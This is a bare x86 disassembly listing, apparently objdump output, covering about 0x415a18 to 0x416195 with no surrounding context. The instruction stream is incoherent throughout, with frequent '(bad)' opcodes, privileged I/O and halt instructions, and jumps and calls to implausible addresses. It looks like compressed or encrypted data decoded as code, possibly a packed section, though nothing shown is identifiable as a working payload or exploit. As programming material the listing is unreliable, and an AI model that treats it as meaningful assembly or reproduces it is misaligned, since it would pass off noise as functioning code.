  415a18:	sub    BYTE PTR [edi],0xfd
  415a1b:	fstp   st(2)
  415a1d:	clc    
  415a1e:	mov    BYTE PTR [eax-0x16],bl
  415a21:	or     eax,0xb90ef924
  415a26:	jbe    0x415a76
  415a28:	cli    
  415a29:	jp     0x415a23
  415a2b:	ins    BYTE PTR es:[edi],dx
  415a2c:	add    BYTE PTR [eax],al
  415a2e:	add    BYTE PTR [eax],al
  415a30:	add    dl,dh
  415a32:	pop    es
  415a33:	sbb    DWORD PTR [edi],esi
  415a35:	repz fld DWORD PTR [ecx]
  415a38:	jmp    0xdbb55eb3
  415a3d:	std    
  415a3e:	xchg   BYTE PTR [edi+esi*8-0x1],dh
  415a42:	xor    eax,0x3ff5ed24
  415a47:	adc    al,0x62
  415a49:	sub    bl,BYTE PTR [ebx+0x271a7fe]
  415a4f:	mov    DWORD PTR [esi],ebp
  415a51:	xchg   edx,eax
  415a52:	sub    dl,al
  415a54:	icebp  
  415a55:	jbe    0x415a88
  415a57:	push   esi
  415a58:	imul   BYTE PTR [edx-0x22]
  415a5b:	adc    esp,DWORD PTR [edx-0x20]
  415a5e:	test   DWORD PTR [ebp+ecx*1+0x3d],esi
  415a62:	xchg   DWORD PTR [ebp+eax*1+0x3d],esi
  415a66:	mov    al,ds:0x86025e2f
  415a6b:	mov    DWORD PTR [ecx-0x3815603],esi
  415a71:	or     BYTE PTR [ecx+0x276eb28],al
  415a77:	add    bh,BYTE PTR ds:0x6f8b2f15
  415a7d:	sub    al,BYTE PTR [edx]
  415a7f:	add    cl,ch
  415a81:	test   eax,0xc07e3614
  415a87:	call   0xfdc89806
  415a8c:	fs pop ds
  415a8e:	ud2    
  415a90:	add    BYTE PTR [edi-0x39],ah
  415a93:	and    edx,DWORD PTR [eax+eax*1]
  415a96:	add    BYTE PTR [eax],al
  415a98:	add    BYTE PTR [eax],al
  415a9a:	addr16 push esp
  415a9c:	xchg   esi,eax
  415a9e:	hlt    
  415a9f:	xor    eax,DWORD PTR [esi+0x1]
  415aa2:	(bad)  
  415aa4:	xchg   dh,al
  415aa6:	and    al,0xde
  415aa8:	inc    eax
  415aa9:	add    esp,ecx
  415aab:	fcomp  DWORD PTR [ebp-0x75]
  415aae:	pop    edi
  415aaf:	fadd   st(1),st
  415ab1:	or     al,0x9c
  415ab3:	retf   0xec86
  415ab6:	std    
  415ab7:	into   
  415ab8:	push   ebp
  415ab9:	mov    esp,ecx
  415abb:	xchg   DWORD PTR [ebx+ecx*4+0x45],edx
  415abf:	ins    DWORD PTR es:[edi],dx
  415ac0:	sub    DWORD PTR [eax],0xffffff9e
  415ac3:	add    eax,DWORD PTR [eax]
  415ac5:	add    DWORD PTR ds:0x100ffbf2,eax
  415acb:	pop    es
  415acc:	add    BYTE PTR [eax],al
  415ace:	pop    esp
  415acf:	jp     0x415ac7
  415ad1:	bswap  edx
  415ad3:	jg     0x415ad5
  415ad5:	add    BYTE PTR [esp+ecx*1-0x3d],cl
  415ad9:	call   0x3ccfcc
  415ade:	loopne 0x415aa3
  415ae0:	jno    0x415ae7
  415ae2:	fisttp WORD PTR [ebx-0x5]
  415ae5:	jmp    0x415ac0
  415ae7:	pop    es
  415ae8:	mov    ebp,DWORD PTR [esi+ecx*2]
  415aeb:	add    eax,DWORD PTR [eax]
  415aed:	lea    esp,[ebx+0x1cfffe92]
  415af3:	aam    0x84
  415af5:	dec    ebp
  415af6:	xor    al,0xb
  415af8:	inc    ecx
  415af9:	or     al,0x44
  415afb:	mov    al,ds:0x142
  415b00:	add    BYTE PTR [eax],al
  415b02:	add    BYTE PTR [edx+ecx*1],bl
  415b05:	mov    ebx,0x31e24
  415b0a:	mov    eax,0xfffd8b0c
  415b0f:	pop    ss
  415b10:	jae    0x415b1d
  415b12:	dec    ebp
  415b13:	jne    0x415b7e
  415b15:	ja     0x415b5a
  415b17:	jns    0x415ae5
  415b19:	jbe    0x415b76
  415b1b:	ins    DWORD PTR es:[edi],dx
  415b1c:	jno    0x415b2b
  415b1e:	inc    ebx
  415b1f:	je     0x415aba
  415b21:	js     0x415b9e
  415b23:	shl    esi,1
  415b25:	mov    dh,BYTE PTR [ebp+0x19b91]
  415b2b:	out    dx,al
  415b2c:	iret   
  415b2d:	fwait
  415b2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b2f:	inc    ebx
  415b30:	sub    BYTE PTR [ebx-0x375ec779],cl
  415b36:	lds    esp,FWORD PTR [ecx]
  415b38:	sti    
  415b39:	mov    dh,BYTE PTR [ebx-0x63]
  415b3c:	adc    eax,DWORD PTR [ebp+0xc]
  415b3f:	(bad)  
  415b40:	(bad)  
  415b41:	inc    edi
  415b42:	call   DWORD PTR [edx+0x75080d1b]
  415b48:	push   edi
  415b49:	repnz mov dl,al
  415b4c:	mov    ah,0xff
  415b4e:	push   DWORD PTR [ebp+0x14]
  415b51:	adc    eax,0xfd56fe08
  415b56:	out    0xb6,eax
  415b58:	pop    esi
  415b59:	add    al,BYTE PTR [eax]
  415b5b:	out    dx,al
  415b5c:	push   esi
  415b5d:	stc    
  415b5e:	pop    eax
  415b5f:	dec    esi
  415b60:	xchg   ebx,eax
  415b61:	xor    edi,ebp
  415b63:	enter  0x99a3,0x6f
  415b67:	add    BYTE PTR [eax],al
  415b69:	add    BYTE PTR [eax],al
  415b6b:	add    bl,al
  415b6d:	xchg   esp,eax
  415b6e:	mov    WORD PTR [ebp-0x5d],ds
  415b71:	push   edx
  415b72:	mov    edi,0x76ce7508
  415b77:	in     al,dx
  415b78:	idiv   BYTE PTR [edi+0x2efe55fd]
  415b7e:	hlt    
  415b7f:	push   esp
  415b80:	out    dx,al
  415b81:	ret    0x8593
  415b84:	dec    ebp
  415b85:	cdq    
  415b86:	add    DWORD PTR [eax],eax
  415b88:	je     0x415bac
  415b8a:	push   cs
  415b8b:	hlt    
  415b8c:	cmp    DWORD PTR [eax*4+0xa0283f6],0x599b3079
  415b97:	mov    ?,eax
  415b99:	test   DWORD PTR [ebx-0x3d],ebp
  415b9c:	popa   
  415b9d:	push   ds
  415b9e:	dec    edi
  415b9f:	add    ebp,DWORD PTR [ebp+0x2]
  415ba2:	out    0xc8,eax
  415ba4:	retf   0x6e77
  415ba7:	fbstp  TBYTE PTR [edx+eax*1-0x19]
  415bab:	cld    
  415bac:	aas    
  415bad:	xchg   edx,eax
  415bae:	sbb    bh,BYTE PTR [edi-0x8]
  415bb1:	out    0xe7,al
  415bb3:	add    esi,DWORD PTR [ebp+0x33]
  415bb6:	jo     0x415bf6
  415bb8:	mov    cl,0x7b
  415bba:	lods   al,BYTE PTR ds:[esi]
  415bbb:	repz xchg edx,eax
  415bbd:	adc    ah,BYTE PTR [ebx-0x5b868afe]
  415bc3:	(bad)  
  415bc4:	out    dx,eax
  415bc5:	jge    0x415bca
  415bc7:	add    dh,BYTE PTR [ebp+0x2]
  415bca:	(bad)  
  415bcb:	retf   
  415bcc:	repz aas 
  415bce:	das    
  415bcf:	js     0x415bd1
  415bd1:	add    BYTE PTR [eax],al
  415bd3:	add    BYTE PTR [eax],al
  415bd5:	ss repnz push cs
  415bd8:	mov    esi,0x8ce70331
  415bdd:	out    0x86,al
  415bdf:	bound  eax,QWORD PTR [esi-0x7b]
  415be2:	call   0x4672:0x856247d5
  415be9:	pop    ebp
  415bea:	jns    0x415b98
  415bec:	xchg   edi,eax
  415bed:	stos   DWORD PTR es:[edi],eax
  415bee:	test   DWORD PTR [edi-0x1053974],esi
  415bf4:	or     eax,0x2fe685cb
  415bf9:	dec    esp
  415bfa:	div    BYTE PTR [ebx+ecx*4]
  415bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bfe:	not    ch
  415c00:	adc    DWORD PTR [ebp-0x66],edi
  415c03:	cmp    eax,0x26852012
  415c08:	sub    dh,BYTE PTR [edx]
  415c0a:	shr    bl,0x3
  415c0d:	cld    
  415c0e:	cmp    eax,0x7a0d0d00
  415c13:	dec    esp
  415c14:	add    eax,0x1d892f01
  415c19:	adc    eax,0xfbd7fcfd
  415c1e:	ror    DWORD PTR ds:0xd44f239,0x81
  415c25:	mov    al,0x8a
  415c27:	std    
  415c28:	xchg   cl,dh
  415c2a:	add    eax,DWORD PTR [ecx+ebp*8]
  415c2d:	pushf  
  415c2e:	adc    DWORD PTR [edx],eax
  415c30:	jle    0x415c4b
  415c32:	ret    
  415c33:	push   ebx
  415c34:	(bad)  
  415c35:	fnsave [edi+ecx*2]
  415c38:	jo     0x415c3a
  415c3a:	add    BYTE PTR [eax],al
  415c3c:	add    BYTE PTR [eax],al
  415c3e:	xor    al,0x8a
  415c40:	mov    esp,DWORD PTR [esi+edi*8+0x35076831]
  415c47:	(bad)  
  415c4a:	rol    DWORD PTR [ebp+edi*8+0xc10efe9],cl
  415c51:	daa    
  415c52:	xor    al,0x86
  415c54:	push   DWORD PTR ds:0x81e7fa64
  415c5a:	call   0xc6ed:0xb56a0002
  415c61:	sub    esi,DWORD PTR [ecx-0x7c]
  415c64:	addr16 std 
  415c66:	jmp    0x62e8e767
  415c6b:	sbb    al,BYTE PTR [eax]
  415c6d:	cdq    
  415c6e:	out    dx,eax
  415c6f:	out    dx,eax
  415c70:	aas    
  415c71:	xlat   BYTE PTR ds:[ebx]
  415c72:	mov    dh,0x2
  415c74:	sub    DWORD PTR ds:0xd146794d,0x5138586
  415c7e:	inc    edx
  415c7f:	(bad)  
  415c80:	push   DWORD PTR [ecx+0x34]
  415c83:	ret    0x6253
  415c86:	add    bh,BYTE PTR [edx+0x43]
  415c89:	(bad)  
  415c8b:	xchg   esi,eax
  415c8c:	sbb    BYTE PTR [eax],al
  415c8e:	jg     0x415d0b
  415c90:	rcl    al,0x6a
  415c93:	iret   
  415c94:	cmp    BYTE PTR [eax+0xf00001d],ah
  415c9a:	fwait
  415c9b:	pop    ebp
  415c9c:	add    BYTE PTR [eax],al
  415c9e:	or     al,0x5
  415ca0:	inc    ecx
  415ca1:	or     BYTE PTR [eax],al
  415ca3:	add    BYTE PTR [eax],al
  415ca5:	add    BYTE PTR [eax],al
  415ca7:	pop    edi
  415ca8:	mov    edi,0xcfe86a04
  415cad:	test   BYTE PTR [ebp+0x8],al
  415cb0:	push   0x78f3fab0
  415cb5:	push   eax
  415cb6:	jmp    FWORD PTR [ecx-0x23bfea3d]
  415cbc:	jl     0x415c82
  415cbe:	or     al,0x59
  415cc0:	mov    edi,0x13840b
  415cc5:	add    BYTE PTR [eax],al
  415cc7:	inc    esp
  415cc8:	xchg   ebp,eax
  415cc9:	or     al,0x1
  415ccb:	pushf  
  415ccc:	push   es
  415ccd:	inc    ecx
  415cce:	clc    
  415ccf:	inc    ecx
  415cd0:	inc    edx
  415cd1:	in     al,dx
  415cd2:	xor    ebx,DWORD PTR [edx-0x31]
  415cd5:	test   BYTE PTR [ebp+0x4c],dh
  415cd8:	addr16 cwde 
  415cda:	dec    ebp
  415cdb:	popf   
  415cdc:	inc    DWORD PTR [ebp+eax*2+0x75c3b450]
  415ce3:	mov    BYTE PTR [esp+edi*8+0x790408eb],ch
  415cea:	in     al,dx
  415ceb:	fistp  QWORD PTR [eax+0xa]
  415cee:	jb     0x415d3f
  415cf0:	in     eax,0x9
  415cf2:	pop    edi
  415cf3:	aaa    
  415cf4:	jns    0x415d6c
  415cf6:	cs loope 0x415cd0
  415cf9:	or     ch,BYTE PTR [edx+0x28]
  415cfc:	js     0x415d6f
  415cfe:	hlt    
  415cff:	fbstp  TBYTE PTR [edi+0x11]
  415d02:	inc    esp
  415d03:	cmp    bh,BYTE PTR [edi]
  415d05:	add    BYTE PTR [ebx-0x3f7d7628],al
  415d0b:	add    BYTE PTR [eax],al
  415d0d:	add    BYTE PTR [eax],al
  415d0f:	add    BYTE PTR [ebp+0x25],dh
  415d12:	cmc    
  415d13:	inc    ebp
  415d14:	hlt    
  415d15:	push   edi
  415d16:	stos   DWORD PTR es:[edi],eax
  415d17:	call   FWORD PTR [edx]
  415d19:	cdq    
  415d1a:	int3   
  415d1b:	hlt    
  415d1c:	xchg   DWORD PTR [edi+0x439c099b],esi
  415d22:	stos   DWORD PTR es:[edi],eax
  415d23:	inc    DWORD PTR [edx]
  415d25:	cdq    
  415d26:	add    al,0x73
  415d28:	stc    
  415d29:	in     eax,0x10
  415d2b:	xor    edi,eax
  415d2d:	sbb    eax,0x20a47487
  415d32:	cmp    eax,0x58f6fc
  415d37:	sbb    BYTE PTR [ebp-0x6b],0x4
  415d3b:	mov    eax,DWORD PTR [ebp+0x5]
  415d3e:	subps  xmm7,xmm6
  415d41:	mov    al,ds:0xa749c77e
  415d46:	retf   0xbd4a
  415d49:	mov    ds:0x215088f6,al
  415d4e:	fcmovnbe st,st(6)
  415d50:	hlt    
  415d51:	das    
  415d52:	test   BYTE PTR [ebx+0x4414993e],cl
  415d58:	aaa    
  415d59:	xchg   esi,eax
  415d5a:	lods   al,BYTE PTR ds:[esi]
  415d5b:	call   DWORD PTR [edx+0x7d4cc98]
  415d61:	out    0x7a,al
  415d63:	fisttp QWORD PTR [eax+esi*8]
  415d66:	stos   BYTE PTR es:[edi],al
  415d67:	(bad)  
  415d68:	jp     0x415d02
  415d6a:	jbe    0x415cf5
  415d6c:	dec    esi
  415d6d:	imul   eax,DWORD PTR [ecx],0x0
  415d70:	clc    
  415d71:	sahf   
  415d72:	test   eax,ebp
  415d74:	add    BYTE PTR [eax],al
  415d76:	add    BYTE PTR [eax],al
  415d78:	add    BYTE PTR [eax-0x48],al
  415d7b:	mov    ch,bh
  415d7d:	icebp  
  415d7e:	sub    ecx,DWORD PTR ds:0x84f75217
  415d84:	call   0xfdc9fc6f
  415d89:	lock not BYTE PTR [eax+0x2c02c8e8]
  415d90:	add    esi,DWORD PTR [ebp+0x34]
  415d93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d94:	sub    bl,cl
  415d96:	fstp   QWORD PTR [edi+0x620271c5]
  415d9c:	sbb    DWORD PTR ds:[eax-0x1547fb05],edx
  415da3:	mov    eax,ds:0x41027502
  415da8:	add    al,0xab
  415daa:	adc    esp,0xe6c26343
  415db0:	clc    
  415db1:	sub    al,cl
  415db3:	test   BYTE PTR [ecx+esi*4+0x7cab9e0e],0x42
  415dbb:	retf   0xdd3e
  415dbe:	dec    eax
  415dbf:	sub    eax,0x258ad2fc
  415dc4:	add    ah,bh
  415dc6:	(bad)  
  415dc7:	loop   0x415dfc
  415dc9:	shl    bh,0xde
  415dcc:	and    edx,esi
  415dce:	enter  0x84ef,0xbb
  415dd2:	or     eax,0x3e8688b5
  415dd7:	std    
  415dd8:	inc    ebx
  415dd9:	jne    0x415d60
  415ddb:	and    esi,edi
  415ddd:	add    BYTE PTR [eax],al
  415ddf:	add    BYTE PTR [eax],al
  415de1:	add    ch,dh
  415de3:	sub    eax,0x716a4e11
  415de9:	mov    cl,BYTE PTR [eax-0x7ef19d7f]
  415def:	fst    DWORD PTR [ebx+ebx*4-0x77d97fde]
  415df6:	hlt    
  415df7:	xor    cl,0x11
  415dfa:	xchg   edx,eax
  415dfb:	jmp    0x415e12
  415dfd:	lods   al,BYTE PTR ds:[esi]
  415dfe:	bound  eax,QWORD PTR [ecx-0x7e7ee219]
  415e04:	jl     0x415d95
  415e06:	inc    BYTE PTR [ebp-0x7eb7304a]
  415e0c:	add    dh,dh
  415e0e:	xchg   DWORD PTR [edi+0x13],edi
  415e11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e12:	inc    esp
  415e13:	inc    ecx
  415e14:	add    BYTE PTR [edx+0x35],ch
  415e17:	push   cs
  415e18:	sub    DWORD PTR [ecx+0x43c19422],0x1f
  415e1f:	fidivr WORD PTR [edi-0x2e]
  415e22:	jo     0x415e19
  415e24:	or     eax,esi
  415e26:	fs jle 0x415db2
  415e29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e2a:	jmp    0x7729aad0
  415e2f:	mov    eax,ds
  415e31:	scas   al,BYTE PTR es:[edi]
  415e32:	fs jle 0x415e1d
  415e35:	xchg   ebx,eax
  415e36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e37:	jg     0x415e36
  415e39:	ins    BYTE PTR es:[edi],dx
  415e3a:	test   BYTE PTR [edx-0x18],dh
  415e3d:	lods   eax,DWORD PTR ds:[esi]
  415e3e:	xor    eax,0xb663fd81
  415e43:	push   0x8652
  415e48:	add    BYTE PTR [eax],al
  415e4a:	add    dl,bh
  415e4c:	jle    0x415ea1
  415e4e:	jb     0x415e3d
  415e50:	sub    ah,0xd9
  415e53:	xchg   eax,ebx
  415e55:	push   esp
  415e56:	pop    esp
  415e57:	xor    al,0x7e
  415e59:	push   eax
  415e5a:	push   ecx
  415e5b:	int3   
  415e5c:	int3   
  415e5d:	(bad)  
  415e5e:	call   0xd4c8d892
  415e63:	repnz test ch,bh
  415e66:	aam    0x9a
  415e68:	xor    al,al
  415e6a:	push   edx
  415e6b:	outs   dx,DWORD PTR ds:[esi]
  415e6c:	mov    esi,DWORD PTR [ebx+0x3d]
  415e6f:	push   cs
  415e70:	lds    ecx,FWORD PTR [edi]
  415e72:	lahf   
  415e73:	push   ebx
  415e74:	push   0xffffffdc
  415e76:	sub    al,0xf2
  415e78:	jle    0x415dfb
  415e7a:	daa    
  415e7b:	jne    0x415e71
  415e7d:	add    BYTE PTR [ebx-0x533a2196],dl
  415e83:	add    BYTE PTR [si-0x7ae9],0xc6
  415e89:	mov    al,BYTE PTR [eax]
  415e8b:	and    edi,DWORD PTR [ebp-0x7a]
  415e8e:	inc    ebp
  415e8f:	je     0x415e8e
  415e91:	jo     0x415e8f
  415e93:	pop    ebx
  415e94:	rol    DWORD PTR [edx+0x9],1
  415e97:	xlat   BYTE PTR ds:[ebx]
  415e98:	cmp    DWORD PTR [eax+edx*2],ecx
  415e9b:	sbb    edx,DWORD PTR [ebx]
  415e9d:	clc    
  415e9e:	push   0x1c
  415ea0:	sbb    al,BYTE PTR [esi]
  415ea2:	call   0x3e4397
  415ea7:	xchg   edi,eax
  415ea8:	xchg   ebx,eax
  415ea9:	xor    esi,0x45886a50
  415eaf:	add    BYTE PTR [eax],al
  415eb1:	add    BYTE PTR [eax],al
  415eb3:	add    BYTE PTR [edi*8-0x641574c9],al
  415eba:	jne    0x415f2f
  415ebc:	or     eax,0x90c08404
  415ec1:	add    al,dh
  415ec3:	inc    ebp
  415ec4:	out    dx,eax
  415ec5:	push   es
  415ec6:	call   0x481ee8
  415ecb:	mov    ebp,DWORD PTR [ecx-0x6e]
  415ece:	sti    
  415ecf:	dec    ebp
  415ed0:	clc    
  415ed1:	adc    al,cl
  415ed3:	push   edi
  415ed4:	in     al,0x32
  415ed6:	push   esp
  415ed7:	dec    DWORD PTR [ebx-0x7]
  415eda:	inc    eax
  415edb:	adc    ebp,DWORD PTR [ebx+0x28]
  415ede:	push   edi
  415edf:	leave  
  415ee0:	pop    esi
  415ee1:	ja     0x415ee0
  415ee3:	push   esp
  415ee4:	daa    
  415ee5:	xchg   edi,eax
  415ee6:	dec    ebp
  415ee7:	push   ecx
  415ee8:	fild   QWORD PTR ds:0x73c68b53
  415eee:	mov    bh,dh
  415ef0:	push   ebx
  415ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ef2:	pop    ss
  415ef3:	neg    BYTE PTR [ecx]
  415ef5:	rcl    DWORD PTR ds:0x7e833c23,0x3
  415efc:	jle    0x415efa
  415efe:	leave  
  415eff:	(bad)  
  415f01:	ret    0xe8fb
  415f04:	fbstp  TBYTE PTR [ecx-0x2]
  415f07:	push   DWORD PTR [ebp-0x71]
  415f0a:	cmp    al,0xa5
  415f0d:	pushf  
  415f0e:	std    
  415f0f:	xor    DWORD PTR ds:0x4a833014,esi
  415f15:	idiv   ah
  415f17:	xor    BYTE PTR [eax],al
  415f19:	add    BYTE PTR [eax],al
  415f1b:	add    BYTE PTR [eax],al
  415f1d:	push   ds
  415f1e:	add    al,0x2
  415f20:	mov    ebx,DWORD PTR [edx+0x1dca7abd]
  415f26:	shl    cl,1
  415f28:	(bad)  
  415f29:	sub    dh,BYTE PTR [eax+0x4c]
  415f2c:	clc    
  415f2d:	(bad)  
  415f2e:	in     al,0xba
  415f30:	call   0x42de55
  415f35:	clc    
  415f36:	test   al,0x6
  415f38:	(bad)  [edx]
  415f3a:	mov    BYTE PTR ss:[ebp-0x5a],dl
  415f3e:	inc    ecx
  415f3f:	sbb    bh,bl
  415f41:	cli    
  415f42:	scas   eax,DWORD PTR es:[edi]
  415f43:	test   BYTE PTR [ebx-0xf],bh
  415f46:	imul   ecx,DWORD PTR [esi],0x126ff22
  415f4c:	test   BYTE PTR [ebp-0x520218e4],dh
  415f52:	aaa    
  415f53:	repz mov ch,0xb5
  415f56:	sbb    esi,DWORD PTR [ebx+ecx*4]
  415f59:	xor    esp,DWORD PTR [ebp+0x31]
  415f5c:	or     eax,0x4fff2f0b
  415f61:	out    dx,al
  415f62:	and    eax,0xd165fcfc
  415f67:	lock jae 0x415fde
  415f6a:	imul   edx,DWORD PTR [ecx-0x1],0xc728b743
  415f71:	mov    bh,0x64
  415f73:	add    DWORD PTR [ebx-0x2],edx
  415f76:	aam    0x80
  415f78:	in     al,dx
  415f79:	fldcw  WORD PTR [ebx+0x1]
  415f7c:	add    BYTE PTR [esi],ah
  415f7e:	lahf   
  415f7f:	sub    al,0x8b
  415f81:	add    BYTE PTR [eax],al
  415f83:	add    BYTE PTR [eax],al
  415f85:	add    BYTE PTR [eax],dh
  415f87:	cmp    DWORD PTR [eax+ebp*8],esi
  415f8a:	add    BYTE PTR [edx],0xb2
  415f8d:	add    dh,BYTE PTR [ebp-0x75]
  415f90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f91:	xchg   edi,eax
  415f92:	test   BYTE PTR [edx-0x64],0xfc
  415f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f97:	inc    edx
  415f98:	add    ch,al
  415f9a:	jbe    0x415f9e
  415f9c:	out    0x78,eax
  415f9e:	(bad)  
  415f9f:	jb     0x416005
  415fa1:	mov    cs,ecx
  415fa3:	or     al,0x62
  415fa5:	mov    esi,0x8499df4d
  415faa:	xor    BYTE PTR [esp+ebp*1+0x5442f6a0],cl
  415fb1:	cli    
  415fb2:	and    eax,edi
  415fb4:	ret    0xf59b
  415fb7:	ror    ebp,1
  415fb9:	test   BYTE PTR [ecx+ebx*2],bl
  415fbc:	push   0x1e
  415fbe:	sub    DWORD PTR [ebx],eax
  415fc0:	addr16 push es
  415fc2:	add    bh,BYTE PTR gs:[ebx]
  415fc5:	sub    eax,0xde87cf4
  415fca:	inc    edi
  415fcb:	mov    DWORD PTR [esp+edi*8],esp
  415fce:	(bad)  
  415fcf:	(bad)  
  415fd1:	xor    al,ah
  415fd3:	pop    ss
  415fd4:	sti    
  415fd5:	lock call 0x6c02:0xcd1e6a02
  415fdd:	lea    eax,[ecx+0x31]
  415fe0:	jb     0x415ff0
  415fe2:	rol    DWORD PTR [ecx+0x44f5ffae],1
  415fe8:	ficomp WORD PTR [ecx]
  415fea:	add    BYTE PTR [eax],al
  415fec:	add    BYTE PTR [eax],al
  415fee:	add    BYTE PTR [ecx-0x797b422c],cl
  415ff4:	(bad)  
  415ff5:	hlt    
  415ff6:	inc    ebx
  415ff7:	jne    0x415f7a
  415ff9:	sub    esi,edi
  415ffb:	test   DWORD PTR [edx-0x2d],0x3ec791f0
  416002:	js     0x41603a
  416004:	jp     0x41606e
  416006:	mov    ebp,0xe900039c
  41600b:	jbe    0x416048
  41600d:	inc    ebx
  41600e:	cmp    DWORD PTR [esp+ebx*2-0x3e121017],eax
  416015:	div    DWORD PTR [eax-0x5d]
  416018:	pop    esi
  416019:	push   ecx
  41601a:	push   ss
  41601b:	dec    ebx
  41601c:	adc    eax,0x8b76a911
  416021:	jae    0x41601c
  416023:	cmp    bl,BYTE PTR [edx+0x51]
  416026:	xchg   ecx,eax
  416027:	or     al,BYTE PTR [edx]
  416029:	add    cl,ch
  41602b:	test   DWORD PTR [ecx+0x260e6143],ecx
  416031:	adc    ch,al
  416033:	jbe    0x416068
  416035:	shr    dl,0x9c
  416038:	cmp    al,BYTE PTR [ebx-0x7]
  41603b:	lods   al,BYTE PTR ds:[esi]
  41603c:	rol    DWORD PTR [esi-0x3f6e981b],0x71
  416043:	adc    al,0x7e
  416045:	xchg   DWORD PTR [ecx+ebp*4],esi
  416048:	test   DWORD PTR [ebx-0x37],ebx
  41604b:	xor    DWORD PTR [esi],ecx
  41604d:	lods   eax,DWORD PTR ds:[esi]
  41604e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41604f:	add    cl,al
  416051:	xlat   BYTE PTR ds:[ebx]
  416052:	loop   0x416054
  416054:	add    BYTE PTR [eax],al
  416056:	add    BYTE PTR [eax],al
  416058:	xor    ecx,DWORD PTR [edi]
  41605a:	xchg   BYTE PTR [edx+edi*2],dl
  41605d:	add    al,BYTE PTR [eax]
  41605f:	bound  ebp,QWORD PTR [eax+ebx*2+0x508aaa01]
  416066:	cmc    
  416067:	cld    
  416068:	inc    esi
  416069:	xor    eax,eax
  41606b:	adc    ebp,DWORD PTR [edi-0x1c]
  41606e:	xchg   BYTE PTR [edi*8-0x1313752c],ch
  416075:	jb     0x416020
  416077:	iret   
  416078:	(bad)  [edx]
  41607a:	std    
  41607b:	jb     0x4160a8
  41607d:	in     eax,0xf5
  41607f:	xor    dh,BYTE PTR [eax+0x2]
  416082:	add    dl,ch
  416084:	lea    ebp,[eax-0x79]
  416087:	add    cl,ch
  416089:	hlt    
  41608a:	or     dh,BYTE PTR [edi+0x758527d2]
  416090:	pop    eax
  416091:	push   0x8b53cf38
  416096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416097:	add    BYTE PTR [eax+eax*1+0x66],bl
  41609b:	cmp    DWORD PTR [edx],eax
  41609d:	aas    
  41609e:	or     eax,DWORD PTR [ebp+0x6e0]
  4160a4:	xlat   BYTE PTR ds:[ebx]
  4160a5:	dec    ecx
  4160a6:	loope  0x416028
  4160a8:	xor    BYTE PTR [eax],dl
  4160aa:	add    BYTE PTR [edi],cl
  4160ac:	fnstenv [esi-0x1]
  4160af:	dec    DWORD PTR [edx+ecx*8+0x3]
  4160b3:	adc    BYTE PTR ds:0x6c104193,bl
  4160b9:	lea    edi,[ecx-0xc]
  4160bc:	add    BYTE PTR [eax],al
  4160be:	add    BYTE PTR [eax],al
  4160c0:	add    BYTE PTR [edi+ebp*8+0x44],al
  4160c4:	add    DWORD PTR [ecx*4+0x73c785d8],ecx
  4160cb:	imul   edi,DWORD PTR [ecx],0x617616b1
  4160d1:	(bad)
  4160d5:	cmp    esi,ebp
  4160d7:	mov    BYTE PTR [ebx-0x2d],dh
  4160da:	ins    DWORD PTR es:[edi],dx
  4160db:	adc    edi,edi
  4160dd:	mov    esi,ebp
  4160df:	push   ebp
  4160e0:	(bad)  
  4160e1:	jmp    0xcc817429
  4160e6:	test   ah,al
  4160e8:	or     al,0x59
  4160ea:	mov    edi,0x859b0e73
  4160ef:	(bad)  
  4160f0:	fcmovne st,st(5)
  4160f2:	(bad)  
  4160f3:	(bad)  
  4160f4:	cmp    al,cl
  4160f6:	psrad  mm1,0xf7
  4160fa:	cmp    BYTE PTR [ebp-0x1],ah
  4160fd:	aaa    
  4160fe:	push   es
  4160ff:	add    BYTE PTR [eax],al
  416101:	(bad)  
  416102:	cld    
  416103:	ss sti 
  416105:	jne    0x41615e
  416107:	sbb    al,0x89
  416109:	cmp    BYTE PTR [ecx-0x14],bh
  41610c:	mov    edi,0x16aae
  416111:	jbe    0x41613b
  416113:	nop
  416114:	lea    ebx,[esi-0x35fffe96]
  41611a:	shr    esi,0x50
  41611d:	push   0x24
  41611f:	outs   dx,BYTE PTR ds:[esi]
  416120:	add    ah,BYTE PTR [edi+0xc08529]
  416126:	add    BYTE PTR [eax],al
  416128:	add    BYTE PTR [eax],al
  41612a:	loope  0x416191
  41612c:	or     BYTE PTR [ebx+0x65],0xe0
  416130:	(bad)  
  416131:	xsha256 (bad)
  416132:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416133:	adc    DWORD PTR [eax+0x47],ecx
  416136:	je     0x4161a1
  416138:	(bad)  
  416139:	out    0x66,eax
  41613b:	xchg   edi,eax
  41613c:	cmp    ch,0x0
  41613f:	div    BYTE PTR [eax+ebp*8+0x18]
  416143:	sub    al,BYTE PTR [ecx]
  416145:	add    BYTE PTR [edx+ecx*2],cl
  416148:	add    DWORD PTR [eax],eax
  41614a:	jne    0x416164
  41614c:	push   esi
  41614d:	mov    DWORD PTR [esi],esi
  41614f:	push   esp
  416150:	cmc    
  416151:	iret   
  416152:	dec    esi
  416153:	push   ds
  416154:	je     0x4161c7
  416156:	push   ebx
  416157:	ret    
  416158:	cmp    cl,ch
  41615a:	push   0xffffffed
  41615c:	dec    edi
  41615d:	push   edx
  41615f:	push   0xb4d01eb
  416164:	mov    DWORD PTR [ebx+0x29],eax
  416167:	ins    BYTE PTR es:[edi],dx
  416168:	mov    bh,0x46
  41616a:	lea    ecx,[ebx]
  41616c:	mov    ecx,DWORD PTR [esi-0x66]
  41616f:	add    eax,DWORD PTR [ecx-0x21]
  416172:	jge    0x41617f
  416174:	or     edi,DWORD PTR [edi-0x4a3b0da5]
  41617a:	call   0x79ab84a9
  41617f:	sbb    DWORD PTR [ebp+0x5201ed43],ecx
  416185:	das    
  416186:	sbb    edi,DWORD PTR [ecx]
  416188:	fnstsw WORD PTR [edx]
  41618a:	push   0x37486
  41618f:	add    BYTE PTR [eax],al
  416191:	add    BYTE PTR [eax],al
  416193:	jne    0x416197
  416195:	rcr    DWORD PTR [eax],0x2d
